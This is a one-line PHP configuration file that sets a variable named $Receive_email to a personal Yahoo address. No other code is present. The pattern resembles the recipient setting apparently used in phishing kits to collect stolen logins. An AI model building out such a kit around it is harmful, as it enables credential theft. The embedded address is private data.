<?php 
$Receive_email="alesmadsa@yahoo.com";
?>